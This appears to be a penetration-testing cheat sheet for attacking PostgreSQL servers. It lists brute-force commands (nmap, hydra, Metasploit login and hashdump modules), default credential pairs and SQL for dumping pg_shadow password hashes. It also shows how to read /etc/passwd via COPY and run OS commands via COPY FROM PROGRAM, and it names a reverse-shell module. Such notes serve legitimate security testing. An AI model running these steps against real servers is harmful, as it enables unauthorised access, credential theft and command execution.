---
description: >-
  PostgreSQL is an open source database which can be found mostly in Linux
  operating systems.
---

# 5432 - PostgresSQL

PostgreSQL is an open source database which can be found mostly in Linux operating systems. However it has great compatibility with multiple operating systems and it can run in Windows and MacOS platforms as well. If the database is not properly configured and credentials have been obtained then it is possible to perform various activities like read and write system files and execution of arbitrary code.

## Enumeration

### Nmap

**Version disclosure** 

`Use nmap -sV -p 5432 10.0.0.1`

**Bruteforce credentials:**

`nmap -p 5432 --script pgsql-brute` 

### Metasploit

**Version disclosure** 

`auxiliary/scanner/postgres/postgres_version` 

**Bruteforce login:** 

`auxiliary/scanner/postgres/postgres_login` 

**Dump scheme:** 

`auxiliary/scanner/postgres/postgres_schemadump` 

**Database enumeration:** 

`auxiliary/admin/postgres/postgres_sql` 

**Hashdump:** 

`auxiliary/scanner/postgres/postgres_hashdump` 

**Read files:** 

`auxiliary/admin/postgres/postgres_readfile` 

**Reverse shell** 

`exploit/linux/postgres/postgres_payload` 

## Login

Login using psql:

`psql -h 192.168.100.11 -U postgres`

## Common/default credentials

| Username | Password |
| :--- | :--- |
| postgres | postgres  |
| postgres  | password  |
| postgres  | admin |
| admin | admin |
| admin | password |

### Bruteforce login credentials:

```text
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt 192.168.1.120 postgres
```

## Commands

<table>
  <thead>
    <tr>
      <th style="text-align:left">Description</th>
      <th style="text-align:left">Command</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">List databases</td>
      <td style="text-align:left">\l</td>
    </tr>
    <tr>
      <td style="text-align:left">List databases users</td>
      <td style="text-align:left">\du</td>
    </tr>
    <tr>
      <td style="text-align:left">List existing tables</td>
      <td style="text-align:left">\dt</td>
    </tr>
    <tr>
      <td style="text-align:left">Connect to a specific database</td>
      <td style="text-align:left">\c database_name;</td>
    </tr>
    <tr>
      <td style="text-align:left">Get detailed information on a table</td>
      <td style="text-align:left">\d+ table_name</td>
    </tr>
    <tr>
      <td style="text-align:left">Get table content</td>
      <td style="text-align:left">select * from table_name;</td>
    </tr>
    <tr>
      <td style="text-align:left">Retrieving database passwords</td>
      <td style="text-align:left">
        <p>SELECT * FROM users;</p>
        <p>OR
          <br />select usename, passwd from pg_shadow</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Dumping databases content</td>
      <td style="text-align:left">
        <p>SELECT usename, passwd FROM pg_shadow;
          <br />OR</p>
        <p>pg_dump --host=192.168.100.11 --username=postgres --password --dbname=template1
          --table=&apos;users&apos; -f output_pgdump</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Create a new database</td>
      <td style="text-align:left">CREATE DATABASE [IF NOT EXISTS] db_name;</td>
    </tr>
    <tr>
      <td style="text-align:left">exit the database</td>
      <td style="text-align:left">\q</td>
    </tr>
  </tbody>
</table>

## Command execution

PostgreSQL databases can interact with the underlying operating by allowing the database administrator to execute various database commands and retrieve output from the system. 

Run: 

`postgres=# select pg_ls_dir('./');` 

By executing the following command it is possible to read server side postgres files. 

`postgres=# select pg_read_file('PG_VERSION', 0, 200);` 

It is also possible to create a database table in order to store and view contents of a file that exist in the host. 

```text
postgres-# CREATE TABLE temp(t TEXT); 
postgres-# COPY temp FROM '/etc/passwd'; 
postgres-# SELECT * FROM temp; 
```

OR use the metasploit module 

`Auxiliary/admin/postgres/postgres_readfile` 

### Execute command

```text
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'sudo -l';
SELECT * FROM cmd_exec;

```

